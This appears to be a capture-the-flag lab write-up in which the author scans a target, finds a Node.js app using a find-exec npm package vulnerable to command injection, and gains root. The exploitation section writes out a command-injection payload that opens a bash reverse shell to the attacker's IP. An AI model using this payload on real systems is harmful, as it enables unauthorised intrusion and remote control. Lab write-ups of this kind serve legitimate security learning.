CTF-Labor-200-05

Target IP: 192.168.242.36
Challenge Description: Part 5 of Labor Day CTF Machine.

Reconnaissance


Performing a port scan using the command sudo nmap -sS 192.168.242.36 -p- against the target machine returns the result above. There are two TCP ports open on the target machine.


I performed an aggressive port scan against the two TCP ports and received the result above. There is a HTTP application on the higher port 3000 built using Node.js. I will start enumeration with this port.

Enumeration

Port 3000: HTTP

The webpage above is displayed for this web application. Apparently, this application is using find-exec v1.0.2 npm package. Maybe this is vulnerable?


And bingo! It looks like the find-exec v1.0.2 npm package is vulnerable to command injection, as shown above. The Github repository above also contains the PoC for the command injection attack.


I tested the different payloads by modifying the PoC and obtained the result above. Time to leverage this to a reverse shell connection by exploiting the web application via command injection attack.

Exploitation


I started a listener on my machine at port 80. Then I deployed the payload mplayer; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.45.203/80 0>&1' and instantly got a root reverse shell connection on my machine at port 80. Now I have full control of the target machine. No need to perform privilege escalation on this box, as the exploit lands me a root shell.

Flags


The proof.txt and email5.txt flags are shown above. These flags are obtainable after exploiting the target machine's web application on port 3000.
